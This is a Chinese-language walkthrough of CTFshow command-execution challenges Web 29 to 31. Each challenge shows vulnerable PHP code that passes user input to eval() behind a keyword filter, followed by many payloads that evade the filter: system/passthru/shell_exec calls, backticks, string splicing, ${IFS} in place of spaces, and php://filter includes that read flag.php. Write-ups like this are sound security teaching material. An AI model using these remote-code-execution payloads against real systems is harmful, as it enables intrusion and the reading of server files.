# CTFshow 命令执行（29-77|118-124）

[命令执行的解题技巧](https://blog.csdn.net/qq_53058639/article/details/134156671)

[无参数读文件和RCE总结](https://blog.csdn.net/qq_38154820/article/details/107171940)

## Web 29

代码如下：

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

首先先说一个注意点：`?c=system('ls');`一定不要少了后面的分号，eval内执行的是php代码，必须以分号结尾

有一个Linux命令：`tac`，也就是反向的cat，作用也是反向输出内容，但是不知道为什么，这个题里面使用cat显示不出任何内容，但是tac就可以。

**原因：**`?c=system("cat fla*.php");`页面不会直接显示flag，可以查看网页源代码获取flag，或者：`c=system("cat fla*.php|tac"); `  没什么意义就是了，

> **解释：**
>
> 1. `cat fla*.php`: 这部分命令使用`cat`命令来将以`fla`开头且以`.php`结尾的所有文件内容输出到标准输出（通常是显示在终端上）。
>
> 2. `|`: 这是一个管道符号，它将`cat`命令的输出作为`|`后面命令的输入。
>
> 3. `tac`: 这个命令是`cat`的逆序，它会将输入的文本逆序输出。
>

因为只过滤了“flag”。

所以我们可以：`?c=system("tac fla*.php"); `

或者：`?c=eval($_GET["code"]);&code=system("tac flag.php");`

或者：`c=system("cp fl*g.php a.txt");`然后访问/a.txt

或者：`?c=highlight_file(next(array_reverse(scandir(".")))); `

关于为什么要倒转数组，是因为当遍历目录的时候，数组的第一个是“.”，第二个是“..”，然后是隐藏文件（文件名称以.开头），最后才是我们要的文件，所以到倒转过来。也就是说，我们一直next再next再……也行，但是这就会很麻烦（不知道要试到第几个才行）

> **解释：**
>
> 这行代码是PHP中的一行代码，它有几个部分构成：
>
> 1. `scandir(".")`: 这个函数会列出当前目录中的所有文件和目录，并返回一个数组，数组的每个元素都是当前目录中的一个文件或目录名。
>
>    当你将 "." 作为参数传递给时，它将返回**当前目录中**的文件的名称列表。例如，如果当前目录中有文件 “file1.txt” 和 “file2.txt”，那么将返回数组 。`scandir()``scandir(".")["file1.txt", "file2.txt"]`
>
> 2. `array_reverse()`: 这个函数会将数组中的元素顺序颠倒，即反转数组。
>
> 3. `next()`: 这个函数返回数组中当前指针所在元素的下一个元素，并将数组指针移动到下一个位置。
>
> 4. `highlight_file()`: 这个函数会将指定文件的内容以HTML格式高亮显示，并输出到浏览器或标准输出。
>
> 因此，整个代码的作用是从当前目录中获取所有文件和目录名，然后将这个数组反转，并从反转后的数组中取出下一个文件名，然后将该文件的内容以HTML格式高亮显示输出。
>
> 
>
> 再介绍一个函数：**reset()函数**，作用就是将数组内部指针重新移动到第一个元素，跟next()函数换着用就可以。
>
> 同时还有**show_source()函数**，该函数和highlight_file()函数功能差不多，被过滤时也可以替换为这个试试。

或者 利用参数输入+eval：`?c=eval($_GET[1]);&1=phpinfo();`

或者 利用参数输入+include：`?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php`

> **解释：**
>
> 它试图包含一个通过GET请求传递的参数。
>
> 1. `include $_GET[1]`: 这部分代码试图包含通过GET请求传递的参数所指定的文件。`$_GET[1]`是从GET请求中获取名为`1`的参数的值，然后`include`语句会尝试将这个值作为文件名包含进来。
>
> 2. `1=php://filter/read=convert.base64-encode/resource=flag.php`: 这部分是GET请求中的参数字符串。它的作用是使用PHP的过滤器（filters）功能，将`flag.php`文件的内容以Base64编码的形式读取并传递给`include`语句。具体来说：
>    - `php://filter/read=convert.base64-encode/resource=flag.php`部分是一个PHP过滤器，它将`flag.php`文件的内容读取，并对其进行Base64编码。
>    - `1=`这一部分是参数名，告诉PHP将此值赋给`$_GET[1]`。
>
> 总体来说，这行代码的目的是从服务器文件系统中读取`flag.php`文件的内容，并以Base64编码的形式输出到客户端。





## Web 30

代码如下：

```php
<?php
error_reporting(0);

if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag|system|php/i", $c)) {
        eval($c);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

其中过滤的flag和php仍然可以使用通配符 * 或 ?  模糊匹配绕过。至于system，可以使用`exec`，`shell_exec`，反引号【`$command`】，`passthru`绕过，注意exec和shell_exec需要输出命令执行结果，其中的exec，它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用 PassThru() 这个函数。

**passthru：**

`?c=passthru("ls");`

` ?c=passthru("tac fla*");`

**反引号：**

```
?c=echo `ls`;
?c=echo `tac fla*`;
```

**shell_exec：**

`?c=echo shell_exec("ls");`

` ?c=echo shell_exec("nl fla*|tac");`

**eval绕过：**

` ?c=eval($_GET["code"]);&code=system("tac flag.php");`

`?c=eval($_GET[1]);&1=phpinfo();`

`?c=eval($_GET[1]);&1=system("tac%20flag.php");`

**注意：**拼接法`?c=$a=sys;$b=tem;$d=$a.$b;$d("tac fl*");`（这方法也是没谁了）

**一个linux命令：**

打印文件命令 echo nl  file，这个命令貌似可以在cat、tac被过滤的时候使用。





## Web 31

代码如下：

```php
<?php
error_reporting(0);

if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)) {
        eval($c);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

敏感词： "flag"、"system"、"php"、"cat"、"sort"、"shell"、"."、" "、"'"（空格和单引号）。

我们一个一个看：

1. flag，这个就用通配符就行
2. system，Web 30中已经解决了
3. cat，我们可以使用“tac、nl、cp”等
4. 空格，`%09`、`${IFS}`、`$IFS$9`（`\$IFS\$9`转义）都可以

**解题：**

最简单的：

`?c=passthru("ls");`

`?c=passthru("tac%09fla*");`

**还有：**

`?c=passthru(%22tac\$IFS\$9fla*%22); `也就是`passthru("tac\$IFS\$9fla*");`（%22为双引号）

**使用pos(localeconv)来获取小数点**

localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。这就绕过了小数点限制。

 scandir可以结合它扫描当前目录内容。`?c=print_r(scandir(pos(localeconv())));` 可以看到当前目录，通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后`?c=show_source(next(array_reverse(scandir(pos(localeconv())))));`

这个在**Web 29**有详细解释，这里就是在Web 29的基础上绕过了小数点。

**不懂：**

`?c=show_source(scandir(getcwd())[2]);`

`?c=$f=glob("f*");show_source($f[0]);`

